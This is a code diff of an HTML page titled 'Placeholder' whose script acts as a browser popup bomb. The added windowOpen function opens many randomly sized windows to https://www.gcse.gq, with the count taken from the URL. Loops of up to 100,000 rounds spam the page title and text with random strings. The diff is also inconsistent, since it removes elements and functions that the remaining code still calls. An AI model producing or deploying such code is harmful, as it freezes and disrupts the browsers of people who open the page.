@@ -1,40 +1,36 @@
 <!DOCTYPE HTML>
-
 <html>
     <head>
         <meta charset="utf-8">
 
         <title>Placeholder</title>
+                <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 
     </head>
 
-    <body onload="execute()" style="background-color:#1a1a1a">
-        <div style="text-align:center">
-        <p id="text" style="font-family:'Segoe UI'; color:white; font-size:30px;word-break: break-all;">If you see this message, the URL is not formatted correctly.</p>
-
-        </div>
- <script>
-
-
-           function makeid(length) {
-               var result   = '';
-               var characters  = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-               var charactersLength = characters.length;
-               for ( var i = 0; i < length; i++ ) {
-               result += characters.charAt(Math.floor(Math.random() * 
-               charactersLength));
-               }
+ @@ -28,14 +27,6 @@
                return result;
             }
 
+           function windowOpen(url, amount) {
+
+               for (let i = 0; i < amount; i++) {   
+            const rndInt = Math.floor(Math.random() * 1000) + 10;
+            const rndInt2 = Math.floor(Math.random() * 1000) + 10;
+            window.open(url, "_blank", "resizable=yes, scrollbars=yes, titlebar=yes, width=" + rndInt + ", height=" + rndInt2 + ", top=" + rndInt + ", left=" + rndInt2 + "");
+               }
+             }
 
 
             function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-} 
+ @@ -44,10 +35,7 @@
 
 
         async function execute(){
+            var segments = window.location.href.split("?")
+            tabamount = segments[1];
+            windowOpen("https://www.gcse.gq?" + tabamount, tabamount)
+            for (let i = 0; i < 1000; i++) {   
             for (let i = 0; i < 100000; i++) {   
             document.title = makeid(9);
             document.getElementById("text").innerHTML = makeid(1000);
@@ -46,13 +42,9 @@
             }
   
         }
-
         
          
         </script>
-
-
         
     </body>
-
 </html>
